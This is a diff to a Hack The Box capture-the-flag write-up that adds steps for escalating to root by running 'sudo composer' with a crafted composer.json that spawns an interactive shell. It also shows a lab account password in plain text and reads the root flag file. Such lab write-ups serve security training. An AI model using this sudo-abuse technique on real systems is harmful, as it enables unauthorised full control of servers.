@@ -6,7 +6,13 @@ author: 0b153c
 categories: HTB CTFs
 ---
 
-## Terms
+---
+
+GL HF!
+
+---
+
+## 0 - Introduction
 
 The following two terms will be used throughout the write-up:
 
@@ -490,6 +496,44 @@ Since the current user can run the “composer” tool in an elevated fashion, t
 
 #### 6.1.1
 
+Run the commands, uncovered in 5.2.2, to gain elevated access to the system and confirm successful privilege escalation.
+
+* `TF=$(mktemp -d)`
+
+* `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json`
+
+* `sudo composer --working-dir=$TF run-script x`
+
+* `[sudo] password for mrb3n: mrb3n_Ac@d3my!`
+
+* Confirm success:
+
+  ```bash
+  whoami
+  ```
+
+> ![Screenshot_6.1.1](https://i.ibb.co/Tvw9cgx/6-1-1.png)
+
+Confirming theory from 5.2.2: the documented privilege escalation does--in fact--work. At this point, the entire server is completely compromised as commands can now be run with the highest level of access.
+
 ### 6.2 – Post privilege escalation exploit reconnaissance
 
 #### 6.2.1
+
+Print out the contents of the root.txt file to prove system “own”.
+
+* `cat /root/root.txt`
+
+> ![Screenshot_6.2.1](https://i.ibb.co/h82RXmc/6-2-1.png)
+
+_**CTF objective two of two accomplished!**_
+
+## 7 - CWE References and Recommendations
+
+(Coming Soon...)
+
+---
+
+GG!
+
+---
